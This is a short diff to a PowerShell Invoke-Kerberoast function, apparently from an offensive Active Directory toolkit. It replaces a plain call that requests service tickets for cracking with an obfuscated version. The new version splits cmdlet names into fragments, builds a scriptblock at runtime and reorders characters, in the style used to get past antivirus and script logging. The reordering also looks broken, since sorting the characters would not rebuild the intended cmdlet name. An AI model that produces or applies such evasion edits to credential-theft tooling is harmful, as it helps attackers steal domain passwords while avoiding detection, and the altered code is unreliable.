@@ -1375,7 +1375,7 @@ function Invoke-Kerberoast {
     }
     PROCESS {
         if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
-        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -OutputFormat $OutputFormat
+        &([scriptblock]::Create(('Ge'+'t-Dom'+'ainUser')+' @UserSearcherArguments | Where-Object {$_.samaccountname -ne ''kr'+'btgt''} | '+ (('Get-DomainSPNTicket'.ToCharArray()|Sort-Object{[math]::Abs(65-$_)}|ForEach-Object{$_.ToString()})-join''))) -OutputFormat $OutputFormat
     }
     END {
         if ($LogonToken) {
